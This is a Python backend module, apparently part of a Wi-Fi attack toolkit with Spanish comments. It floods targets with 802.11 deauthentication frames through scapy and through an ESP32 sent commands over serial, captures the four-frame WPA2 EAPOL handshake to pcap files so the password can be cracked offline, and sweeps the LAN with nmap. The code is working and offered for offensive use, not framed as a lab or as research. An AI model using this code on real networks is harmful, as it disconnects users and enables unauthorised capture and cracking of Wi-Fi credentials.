import threading
import time
import os
import subprocess
import xml.etree.ElementTree as ET
from datetime import datetime
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff

from backend.core.socket_manager import socket_manager
from backend.database import SessionLocal
from backend.models import WiFiCapture, WiFiClient
from backend.config import INTERFACE_ATTACK
from .wifi_monitor import wifi_monitor


class WiFiLAN:
    def __init__(self):
        self._deauth_thread = None
        self._sniffer_thread = None
        self.is_deauthing = False
        self.target_bssid = None
        self.handshake_captured = False
        self._eapol_frames = []
        self._serial_lock = threading.Lock()

    # ─── 1. DEAUTH CONTINUO BIDIRECCIONAL ───
    def trigger_deauth(self, iface: str, bssid: str,
                       client: str = "FF:FF:FF:FF:FF:FF",
                       count: int = 0, duration: int = 30):
        self.target_bssid = bssid
        self.is_deauthing = True

        def _run():
            try:
                # AP → Cliente (expulsa al cliente)
                pkt_ap_to_client = (
                    RadioTap() /
                    Dot11(addr1=client, addr2=bssid, addr3=bssid) /
                    Dot11Deauth(reason=7)
                )
                # Cliente → AP (le dice al AP que el cliente se va)
                pkt_client_to_ap = (
                    RadioTap() /
                    Dot11(addr1=bssid, addr2=client, addr3=bssid) /
                    Dot11Deauth(reason=7)
                )

                if count > 0:
                    for _ in range(count):
                        if not self.is_deauthing:
                            break
                        sendp(pkt_ap_to_client, iface=iface, verbose=False, inter=0, count=3)
                        sendp(pkt_client_to_ap,  iface=iface, verbose=False, inter=0, count=3)
                        time.sleep(0.02)
                else:
                    end = time.time() + duration
                    while self.is_deauthing and time.time() < end:
                        sendp(pkt_ap_to_client, iface=iface, verbose=False, inter=0, count=5)
                        sendp(pkt_client_to_ap,  iface=iface, verbose=False, inter=0, count=5)
                        time.sleep(0.05)

            except Exception as e:
                print(f"[DEAUTH ERR] {e}")
            finally:
                self.is_deauthing = False

        threading.Thread(target=_run, daemon=True).start()

    def stop_deauth(self):
        self.is_deauthing = False
        print("[DEAUTH] Stop señalizado")

    # ─── 2. HANDSHAKE SNIFFER — 4 frames EAPOL ───
    def start_handshake_sniffer(self, iface: str, bssid: str):
        self.handshake_captured = False
        self._eapol_frames = []

        def _packet_filter(pkt):
            if self.handshake_captured:
                return
            from scapy.all import EAPOL
            if not (pkt.haslayer(EAPOL) and pkt.haslayer(Dot11)):
                return

            addrs = [
                str(pkt[Dot11].addr1 or "").lower(),
                str(pkt[Dot11].addr2 or "").lower(),
                str(pkt[Dot11].addr3 or "").lower(),
            ]
            if bssid.lower() not in addrs:
                return

            self._eapol_frames.append(pkt)
            print(f"[EAPOL] Frame {len(self._eapol_frames)}/4 capturado")

            if len(self._eapol_frames) >= 4:
                self._save_handshake(bssid, self._eapol_frames)

        def _run_sniffer():
            from scapy.all import conf
            # FIX MT7601U: pcap en lugar de socket raw nativo
            conf.use_pcap = True
            try:
                sniff(
                    iface=iface,
                    prn=_packet_filter,
                    stop_filter=lambda p: self.handshake_captured,
                    timeout=90,
                    store=0
                )
            except Exception as e:
                print(f"[EAPOL SNIFFER ERR] {e}")

        self._sniffer_thread = threading.Thread(target=_run_sniffer, daemon=True)
        self._sniffer_thread.start()

    def _save_handshake(self, bssid: str, packets: list):
        self.handshake_captured = True
        os.makedirs("backend/storage/handshakes", exist_ok=True)
        filename = f"backend/storage/handshakes/handshake_{bssid.replace(':', '')}.pcap"
        from scapy.utils import wrpcap
        wrpcap(filename, packets)
        db = None
        try:
            db = SessionLocal()
            db.add(WiFiCapture(
                ssid="Red Interceptada",
                bssid=bssid,
                channel=1,
                encryption="WPA2",
                capture_type="HANDSHAKE",
                payload_path=filename,
                timestamp=datetime.utcnow()
            ))
            db.commit()
            socket_manager.broadcast_sync("WIFI_HANDSHAKE", {
                "bssid": bssid,
                "status": "SUCCESS",
                "frames": 4,
                "path": filename
            })
        except Exception as e:
            print(f"[ORM ERR] {e}")
        finally:
            if db:
                db.close()

    # ─── 3. ASOCIACIÓN DE RED ───
    def asociar_antena_externa(self, ssid: str, password: str) -> bool:
        iface = INTERFACE_ATTACK
        wifi_monitor.enable_managed_mode()
        time.sleep(0.3)
        try:
            subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
            time.sleep(0.4)
            subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
            time.sleep(0.6)
            subprocess.run(["nmcli", "connection", "delete", ssid], capture_output=True)
            time.sleep(0.2)
            cmd = ["nmcli", "device", "wifi", "connect", ssid,
                   "password", password, "ifname", iface]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
            if proc.returncode == 0:
                time.sleep(3.5)
                return True
            print(f"[NET LINK ERR] {proc.stderr.strip()}")
            return False
        except Exception as e:
            print(f"[NET LINK CRITICAL] {e}")
            return False
    
    def trigger_deauth_esp32_continuo(self, bssid, client, channel, duration=30):
        self.is_deauthing = True

        def _loop():
            end = time.time() + duration
            while self.is_deauthing and time.time() < end:
                # Disparamos ráfagas continuas de 300 paquetes
                self.trigger_deauth_esp32(bssid, client, channel, count=300)
                # REDUCCIÓN CRÍTICA: Bajamos de 0.5s a solo 0.05s para no dejar respirar a la tarjeta de red
                time.sleep(0.05) 
            self.is_deauthing = False
            print("[DEAUTH] Loop terminado")

        threading.Thread(target=_loop, daemon=True).start()
        
    def trigger_deauth_esp32(self, bssid, client, channel, count):
        from backend.core.serial_bridge import serial_bridge
        import json

        cmd = {
            "mod": "WIFI",
            "cmd": "DEAUTH",
            "params": {
                "bssid": bssid,
                "client": client,
                "channel": channel,
                "count": count
            }
        }
        try:
            with self._serial_lock:  # ← evita colisión con el interceptor
                if serial_bridge.serial_conn and serial_bridge.serial_conn.is_open:
                    line = json.dumps(cmd) + "\n"
                    serial_bridge.serial_conn.write(line.encode('utf-8'))
                    print(f"[ESP32 DEAUTH] Enviado → {bssid} CH{channel} x{count}")
                    return True
            return False
        except Exception as e:
            print(f"[ESP32 DEAUTH ERR] {e}")
            return False
    # ─── 4. NMAP — parsing XML ───
    def obtener_segmento_autodetectado(self, iface: str) -> str:
        try:
            cmd = f"ip route show dev {iface} | grep -v default | awk '{{print $1}}'"
            seg = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()
            return seg if seg and "/" in seg else "192.168.1.0/24"
        except Exception:
            return "192.168.1.0/24"

    def trigger_arp_scan(self, ip_range: str = None):
        def _run():
            iface = INTERFACE_ATTACK
            rango = (ip_range if (ip_range and ip_range != "192.168.1.0/24")
                     else self.obtener_segmento_autodetectado(iface))
            print(f"[LAN SCAN] Nmap en {rango}")
            try:
                cmd = ["nmap", "-sn", "-PE", "-oX", "-", rango]
                proc = subprocess.run(cmd, capture_output=True, text=True)

                hosts_detectados = []
                try:
                    root = ET.fromstring(proc.stdout)
                    for host in root.findall("host"):
                        status = host.find("status")
                        if status is None or status.get("state") != "up":
                            continue

                        ip = None
                        mac = "DETECTED"
                        vendor = ""

                        for addr in host.findall("address"):
                            if addr.get("addrtype") == "ipv4":
                                ip = addr.get("addr")
                            elif addr.get("addrtype") == "mac":
                                mac = addr.get("addr", "DETECTED")
                                vendor = addr.get("vendor", "")

                        if not ip:
                            continue
                        if ip.endswith(".0") or ip.endswith(".255"):
                            continue

                        tipo = "DISPOSITIVO DE RED ACTIVO"
                        hostnames = host.find("hostnames")
                        if hostnames is not None:
                            hn = hostnames.find("hostname")
                            if hn is not None:
                                tipo = hn.get("name", tipo)
                        if vendor:
                            tipo += f" ({vendor})"

                        hosts_detectados.append({"ip": ip, "mac": mac, "tipo": tipo})

                except ET.ParseError as xml_err:
                    print(f"[LAN SCAN XML ERR] {xml_err}")

                db = SessionLocal()
                hosts_sincronizados = []
                try:
                    for host in hosts_detectados:
                        row = (db.query(WiFiClient)
                               .filter(WiFiClient.ip_address == host["ip"])
                               .first())
                        if not row:
                            row = WiFiClient(
                                mac=host["mac"],
                                associated_bssid=None,
                                searching_for=None,
                                rssi=0,
                                client_type=host["tipo"],
                                ip_address=host["ip"],
                                last_seen=datetime.utcnow()
                            )
                            db.add(row)
                        else:
                            row.mac = host["mac"]
                            row.client_type = host["tipo"]
                            row.last_seen = datetime.utcnow()
                        db.commit()
                        hosts_sincronizados.append({
                            "ip": host["ip"],
                            "ip_address": host["ip"],
                            "mac": host["mac"],
                            "client_type": host["tipo"],
                            "tipo": host["tipo"]
                        })
                except Exception as orm_err:
                    print(f"[LAN SCAN ORM ERR] {orm_err}")
                finally:
                    db.close()

                print(f"[LAN SCAN] {len(hosts_sincronizados)} hosts -> WebSocket")
                socket_manager.broadcast_sync("WIFI_LAN_HOSTS", hosts_sincronizados)

            except Exception as e:
                print(f"[LAN SCAN CRITICAL] {e}")
                socket_manager.broadcast_sync("WIFI_LAN_HOSTS", [])

        threading.Thread(target=_run, daemon=True).start()


wifi_lan = WiFiLAN()